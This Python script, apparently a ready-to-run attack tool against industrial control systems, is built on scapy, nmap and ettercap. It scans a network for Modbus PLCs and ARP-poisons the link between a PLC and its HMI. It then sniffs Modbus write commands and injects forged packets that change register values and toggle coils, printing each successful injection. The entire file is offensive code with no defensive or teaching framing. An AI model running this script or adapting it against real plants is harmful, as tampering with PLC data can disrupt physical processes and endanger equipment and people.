from time import *
from scapy.all import *
from random import *
import os, nmap



# Modbus ADU
class ModbusTCP(Packet):
    name = "Modbus/TCP"
    x = randrange(100, 1000)
    fields_desc = [ ShortField("Transaction Identifier", x),
                    ShortField("Protocol Identifier", 0),
                    ShortField("Length", 9),
                    XByteField("Unit Identifier", 1),
                    ]

# Modbus PDU
class Modbus(Packet):
    name = "Modbus"
    r = randrange(1, 100)
    c = randrange(100, 110)
    fields_desc = [ XByteField("Function Code", 16),
                    ShortField("Reference Number", c),
                    ShortField("Word Count", 1),
                    XByteField("Byte Count", 2),
                    ShortField("Register Value (UINT16)", r),
                    ]

class Modbus0(Packet):
    name = "Modbus"
    a1 = randrange(40, 50)
    fields_desc = [ XByteField("Function Code", 5),
                    ShortField("Reference Number", a1),
                    ShortField("Data", 0x0000),
                    ]
class Modbus1(Packet):
    name = "Modbus"
    a2 = randrange(40, 50)
    fields_desc = [ XByteField("Function Code", 5),
                    ShortField("Reference Number", a2),
                    ShortField("Data", 0xff00),
                    ]

def changeData_reg(plc):
        s = socket.socket()
        s.connect((plc, 502))   # IP and port
        ss = StreamSocket(s, Raw)
        ss.sr1(Raw(ModbusTCP()/Modbus()))
        time.sleep(0.1)
def changeData0(plc):
    s = socket.socket()
    s.connect((plc, 502))
    ss = StreamSocket(s, Raw)
    ss.sr1(Raw(ModbusTCP()/Modbus0()))

def changeData1(plc):
    s = socket.socket()
    s.connect((plc, 502))
    ss = StreamSocket(s, Raw)
    ss.sr1(Raw(ModbusTCP()/Modbus1()))


plc_ip = ''
def scan():
    nm = nmap.PortScanner()
    net = input("enter your network : ")
    nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
    hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
    for host, state in hosts_list:
        if state == 'open':
           global plc_ip
           plc_ip = host
           print("PLC IP : {}".format(plc_ip))

hmi_ip = ''
def psniff(plcip):
    fil = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plcip)
    p = sniff(iface="eth0", count=1, filter=fil)
    x = p[0]
    global hmi_ip
    hmi_ip = x[IP].src
    print("HMI IP : {}".format(hmi_ip))



scan()
arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
process = os.popen('pgrep -f ettercap')
out = process.read()
process.close()
print("ettercap is running, PID : {}".format(out))
os.system(arp1)
psniff(plc_ip)
arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{plc}// /{hmi}// >/dev/null 2>&1 &'.format(plc=plc_ip, hmi=hmi_ip)
os.system(arp2)
print("ARP Poisoning start")
sleep(4)

while True:
    xx = 1
    while xx:
        pp = "dst host {} and tcp[tcpflags] & tcp-push != 0".format(plc_ip)
        plc_frames = sniff(iface="eth0", count=1, filter=pp)
        modbus_query = plc_frames[0]
        st = str(modbus_query[Raw].load)
        try:
            if "\\x01\\x10\\x00" in st:
                    changeData_reg(plc_ip)
                    xx = 0
                    print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                    print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif st[-9: -1] == "\\xff\\x00":
                    changeData0(plc_ip)
                    xx = 0
                    print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                    print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif st[-9: -1] == "\\x00\\x00":
                    changeData1(plc_ip)
                    xx = 0
                    print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                    print("\033[1;36m{}\033[0m".format(modbus_query.show()))
        except:
            xx = 1
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
